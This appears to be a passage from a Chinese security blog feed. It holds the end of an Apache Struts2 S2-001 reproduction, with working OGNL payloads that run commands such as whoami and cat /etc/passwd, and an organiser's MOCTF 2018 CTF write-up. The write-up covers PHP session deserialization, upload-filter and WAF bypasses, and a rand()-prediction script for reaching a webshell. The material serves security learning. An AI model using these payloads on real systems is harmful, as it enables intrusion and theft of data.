<p>welcome.jsp<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">language</span>=<span class="string">"java"</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span></span></div><div class="line"><span class="tag">    <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span>%&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">prefix</span>=<span class="string">"s"</span> <span class="attr">uri</span>=<span class="string">"/struts-tags"</span> %&gt;</span></div><div class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>S2-001<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello <span class="tag">&lt;<span class="name">s:property</span> <span class="attr">value</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;/<span class="name">s:property</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>struts.xml<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> <span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></div><div class="line"><span class="meta">    "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></div><div class="line"><span class="meta">    "http://struts.apache.org/dtds/struts-2.0.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"S2-001"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.LoginAction"</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></div><div class="line">		<span class="tag">&lt;/<span class="name">action</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">package</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>com.demo.action.LoginAction.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.demo.action;</div><div class="line"></div><div class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</div><div class="line">	<span class="keyword">private</span> String username = <span class="keyword">null</span>;</div><div class="line">	<span class="keyword">private</span> String password = <span class="keyword">null</span>;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.username;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.password;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</div><div class="line">		<span class="keyword">this</span>.username = username;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</div><div class="line">		<span class="keyword">this</span>.password = password;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">		<span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</div><div class="line">			<span class="keyword">return</span> <span class="string">"error"</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</div><div class="line">				&amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</div><div class="line">			<span class="keyword">return</span> <span class="string">"success"</span>;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">return</span> <span class="string">"error"</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h3 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username=xishir&amp;password=%&#123;1+1&#125;</div></pre></td></tr></table></figure>
<p><img src="/img/s2/s2-001-2.png" alt=""></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p>获取tomcat执行路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</div></pre></td></tr></table></figure></p>
<p>获取Web路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125;</div></pre></td></tr></table></figure></p>
<p>执行任意命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</div></pre></td></tr></table></figure></p>
<p>带参数的命令：<code>new java.lang.String[]{&quot;cat&quot;,&quot;/etc/passwd&quot;}</code><br><img src="/img/s2/s2-001-3.png" alt=""></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-001</a><br><a href="http://rickgray.me/review-struts2-remote-command-execution-vulnerabilities.html" target="_blank" rel="noopener">http://rickgray.me/review-struts2-remote-command-execution-vulnerabilities.html</a><br><a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-001" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/struts2/s2-001</a><br><a href="https://chybeta.github.io/2018/02/06/【struts2-命令-代码执行漏洞分析系列】S2-001/" target="_blank" rel="noopener">https://chybeta.github.io/2018/02/06/【struts2-命令-代码执行漏洞分析系列】S2-001/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近经历了几次面试，深觉在企业中，java安全是十分受重视的，于是打算对java安全进行深入学习，本系列是对Struts2的漏洞进行分析与复现，写的不好欢迎大家指出问题，本文所有源码与poc&amp;amp;exp：&lt;a href=&quot;https://github.com/xishir/Struts2Vuls/tree/master/S2-001&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/xishir/Struts2Vuls/tree/master/S2-001&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="https://www.codemonster.cn/tags/RCE/"/>
    
      <category term="Struts2" scheme="https://www.codemonster.cn/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>2018 MOCTF 新春欢乐赛 部分WriteUp+感想</title>
    <link href="https://www.codemonster.cn/2018/02/13/2018-moctf-happy-writeup/"/>
    <id>https://www.codemonster.cn/2018/02/13/2018-moctf-happy-writeup/</id>
    <published>2018-02-13T14:11:58.000Z</published>
    <updated>2018-07-28T06:19:47.791Z</updated>
    
    <content type="html"><![CDATA[<p>从放假到现在筹办准备了接近两个星期的MOCTF新春欢乐赛终于落幕啦，这次比赛我一共出了1签到+1MISC+3WEB，下面先放官方WriteUp（哇终于能当一回官方了）<br><a id="more"></a></p>
<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><h3 id="签到-20"><a href="#签到-20" class="headerlink" title="签到 20"></a>签到 20</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">支付宝今年集齐五福能一起平分多少钱？</div><div class="line">flag格式：moctf&#123;数字&#125;</div></pre></td></tr></table></figure>
<p>flag:moctf{500000000}</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="空word-100"><a href="#空word-100" class="headerlink" title="空word 100"></a>空word 100</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">真的什么都没有吗</div></pre></td></tr></table></figure>
<p>文件是个word<br>打开看发现一些奇怪的换行和tab<br><img src="/img/2018moctf1.png" alt=""><br>很容易想到是摩斯密码，替换后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-.... -.. -.... ..-. -.... ...-- --... ....- -.... -.... --... -... ....- ..--- -.... -.-. ...-- ....- -.... . -.... -... ..... ..-. ...-- ----- --... ..--- ..... ..-. --... ....- -.... .---- -.... ..--- ...-- ..-. --... -..</div></pre></td></tr></table></figure></p>
<p>解摩斯密码，然后hex转字符串得到flag</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="登录一哈-300"><a href="#登录一哈-300" class="headerlink" title="登录一哈 300"></a>登录一哈 300</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">登录一下，你就知道。</div><div class="line">http://111.230.32.124:6001/</div></pre></td></tr></table></figure>
<p>源码放到git里泄露给大家了<br>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);</div><div class="line">    session_start();</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</div><div class="line">        $username = $_POST[<span class="string">'username'</span>];</div><div class="line">        $password = $_POST[<span class="string">'password'</span>];</div><div class="line">        $_SESSION[<span class="string">"username"</span>] = $username;</div><div class="line">        header(<span class="string">"Location:./index.php"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;h1&gt;hello '</span>.$_SESSION[<span class="string">"username"</span>].<span class="string">'&lt;/h1&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> ...</div></pre></td></tr></table></figure></p>
<p>flag.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">session_start();</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MOCTF</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $flag;</div><div class="line">    <span class="keyword">public</span> $name;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;flag = <span class="string">"moctf&#123;xxxxxxxxxxxxxxxx&#125;"</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;flag == <span class="keyword">$this</span>-&gt;name)&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Wow,this is flag:"</span>.<span class="keyword">$this</span>-&gt;flag;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>看源码就可以知道这道题考查的是session反序列漏洞了<br>在index.php中php的序列化handler是’php_binary’，而flag.php里没有设置，就是默认的’php’<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_binary'</span>);</div></pre></td></tr></table></figure></p>
<p>参考<a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a><br>index.php中的<code>$_session[&#39;username&#39;]</code>可控，我们就能构造payload到session，<br>然后访问flag.php页面就能触发反序列化执行<code>__destruct</code>了，<br>这里还有个考点是<code>$this-&gt;flag == $this-&gt;name</code>，通过引用的方式绕过。<br>构造payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$a = <span class="keyword">new</span> MOCTF();</div><div class="line">$a-&gt;name = &amp;$a-&gt;flag;</div><div class="line"><span class="keyword">echo</span> <span class="string">'|'</span>.serialize($a);</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">|O:5:&quot;MOCTF&quot;:2:&#123;s:4:&quot;flag&quot;;N;s:4:&quot;name&quot;;R:2;&#125;</div></pre></td></tr></table></figure>
<p>提交到index.php的username，然后访问flag.php就得到flag了</p>
<h3 id="字符串检查-400"><a href="#字符串检查-400" class="headerlink" title="字符串检查 400"></a>字符串检查 400</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">来检查一下你的字符串是否格式良好吧！</div><div class="line">http://111.230.32.124:6002/</div></pre></td></tr></table></figure>
<p>原意是xxe漏洞读取任意文件<br>后来知道师傅们卡了很久貌似是因为<code>client-ip</code>的原因，我的锅<br>题目打开是个json字符串验证的页面，POST包的<code>Content-Type</code>字段是<code>application/json</code>，<br>POST后接口会返回json格式正确或错误的结果<br>改成<code>application/xml</code>，接口提示只允许本机访问，于是构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">client-ip:localhost</div></pre></td></tr></table></figure></p>
<p>然后就是xxe盲打漏洞了，参考<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a><br>这里我只限制了payload长度为170以内，其实完全可以更短的，希望大佬们可以测试测试<br>最后flag在/etc/passwd</p>
<h3 id="简单审计-400"><a href="#简单审计-400" class="headerlink" title="简单审计 400"></a>简单审计 400</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">代码都给你了，还说不会做？</div><div class="line">http://120.78.57.208:6005/</div></pre></td></tr></table></figure>
<p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_rand_code</span><span class="params">($l = <span class="number">6</span>)</span> </span>&#123;</div><div class="line">    $result = <span class="string">''</span>;</div><div class="line">    <span class="keyword">while</span>($l--) &#123;</div><div class="line">        $result .= chr(rand(ord(<span class="string">'a'</span>), ord(<span class="string">'z'</span>)));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $result;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test_rand_code</span><span class="params">()</span> </span>&#123;</div><div class="line">    $ip=$_SERVER[<span class="string">'REMOTE_ADDR'</span>];</div><div class="line">    $code=get_rand_code();</div><div class="line">    $socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</div><div class="line">    @socket_connect($socket, $ip, <span class="number">8888</span>);</div><div class="line">    @socket_write($socket, $code.PHP_EOL);</div><div class="line">    @socket_close($socket);</div><div class="line">    <span class="keyword">die</span>(<span class="string">'test ok!'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($filename, $content,$savepath)</span> </span>&#123;</div><div class="line">    $AllowedExt = <span class="keyword">array</span>(<span class="string">'bmp'</span>,<span class="string">'gif'</span>,<span class="string">'jpeg'</span>,<span class="string">'jpg'</span>,<span class="string">'png'</span>);</div><div class="line">    <span class="keyword">if</span>(!is_array($filename)) &#123;</div><div class="line">        $filename = explode(<span class="string">'.'</span>, $filename);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(!in_array(strtolower($filename[count($filename)<span class="number">-1</span>]),$AllowedExt))&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">'error ext!'</span>);</div><div class="line">    &#125;</div><div class="line">    $code=get_rand_code();</div><div class="line">    $finalname=$filename[<span class="number">0</span>].<span class="string">'moctf'</span>.$code.<span class="string">"."</span>.end($filename);</div><div class="line">    file_put_contents(<span class="string">"$savepath"</span>.$finalname, $content);</div><div class="line">    usleep(<span class="number">3000000</span>);</div><div class="line">    unlink(<span class="string">"$savepath"</span>.$finalname);</div><div class="line">    <span class="keyword">die</span>(<span class="string">'upload over!'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$savepath=<span class="string">"uploads/"</span>.sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"/"</span>;</div><div class="line"><span class="keyword">if</span>(!is_dir($savepath))&#123;</div><div class="line">    $oldmask = umask(<span class="number">0</span>);</div><div class="line">    mkdir($savepath, <span class="number">0777</span>);</div><div class="line">    umask($oldmask);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))</div><div class="line">&#123;</div><div class="line">    $act=$_GET[<span class="string">'action'</span>];</div><div class="line">    <span class="keyword">if</span>($act===<span class="string">'upload'</span>)</div><div class="line">    &#123;</div><div class="line">        $filename=$_POST[<span class="string">'filename'</span>];</div><div class="line">        <span class="keyword">if</span>(!is_array($filename)) &#123;</div><div class="line">            $filename = explode(<span class="string">'.'</span>, $filename);</div><div class="line">        &#125;</div><div class="line">        $content=$_POST[<span class="string">'content'</span>];</div><div class="line">        waf($content);</div><div class="line">        upload($filename,$content,$savepath);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($act===<span class="string">'test'</span>)</div><div class="line">    &#123;</div><div class="line">        test_rand_code();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    highlight_file(<span class="string">'index.php'</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>解释一下题目的意思<br>根据action执行对应操作，<code>action=test</code>会调用<code>test_rand_code</code>函数发送tcp包到访客的ip<br><code>action=upload</code>时会写入一个文件，文件内容有waf拦截，文件名有白名单限制后缀，<br>然后拼接文件名加入rand的字符串，写入文件，文件写入后过3秒unlink删除<br>有问题的点有这几个<br>1.filename检查是用<code>$filename[count($filename)-1]</code>取的后缀，是按照下标取的，而写入文件时用的是<code>end($filename)</code>，是取最后一个元素，只要post时提交<code>filename[1]=jpg&amp;filename[0]=php</code>就能绕过了<br>2.$content的waf绕过，<script language="php">xxxx</script> 绕过即可<br>3.使用rand()生成随机数，可以被预测，参考<a href="https://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/" target="_blank" rel="noopener">https://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/</a></p>
<p>预期解法是<br>1.username数组bypass后缀检查，绕过content的waf<br>2.rand随机数预测+爆破文件名 在unlink之前访问shell<br>结果大佬们直接非预期解bypass了<code>unlink</code>打扰了<br>非预期解参考<a href="http://skysec.top/2018/02/13/happymoctf之web全题解/" target="_blank" rel="noopener">一叶飘零</a>师傅的WriteUp<br>预期解如下<br>写两个脚本，<br>listen.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#监听8888端口，接受6个`get_rand_code`的结果，然后预测接下来一次`get_rand_code`的结果，这里可能不会很准确，</span></div><div class="line"><span class="comment">#所以需要小幅度爆破，复杂度大概为3^6，反正就跑着呗</span></div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding:utf-8 -*-</span></div><div class="line"><span class="comment">#by xishir</span></div><div class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *  </div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> ctime  </div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">import</span> itertools <span class="keyword">as</span> its</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">r=req.session()</div><div class="line">url=<span class="string">"http://120.78.57.208:6005/"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rand_list</span><span class="params">()</span>:</span></div><div class="line">    HOST = <span class="string">''</span>  </div><div class="line">    PORT = <span class="number">8888</span></div><div class="line">    BUFSIZ = <span class="number">128</span>  </div><div class="line">    ADDR = (HOST, PORT)  </div><div class="line">    tcpSerSock = socket(AF_INET, SOCK_STREAM)</div><div class="line">    tcpSerSock.bind(ADDR)</div><div class="line">    tcpSerSock.listen(<span class="number">5</span>)</div><div class="line">    rand_num=<span class="number">0</span></div><div class="line">    l=[]</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        tcpCliSock, addr = tcpSerSock.accept()  </div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:  </div><div class="line">            data = tcpCliSock.recv(BUFSIZ)  </div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:  </div><div class="line">                <span class="keyword">break</span>  </div><div class="line">            data=data[<span class="number">0</span>:<span class="number">6</span>]</div><div class="line">	    <span class="keyword">print</span> data,l</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> data:</div><div class="line">                l.append(ord(i)+<span class="number">1</span>-ord(<span class="string">'a'</span>))</div><div class="line">        rand_num+=<span class="number">1</span></div><div class="line">      	<span class="keyword">if</span> rand_num==<span class="number">6</span>:</div><div class="line">      		<span class="keyword">break</span></div><div class="line">    tcpCliSock.close()  </div><div class="line">    tcpSerSock.close()</div><div class="line">    <span class="keyword">return</span> l</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_salt</span><span class="params">(l)</span>:</span></div><div class="line">    salt=<span class="string">""</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</div><div class="line">        j=len(l)</div><div class="line">        r=(l[j<span class="number">-3</span>]+l[j<span class="number">-31</span>])<span class="number">-1</span></div><div class="line">        <span class="keyword">if</span> r&gt;<span class="number">26</span>:</div><div class="line">        	r-=<span class="number">26</span></div><div class="line">        <span class="comment">#print l[j-3],chr(l[j-3]+ord('a')-1),l[j-31],chr(l[j-31]+ord('a')-1),r,chr(r+ord('a')-1)</span></div><div class="line">        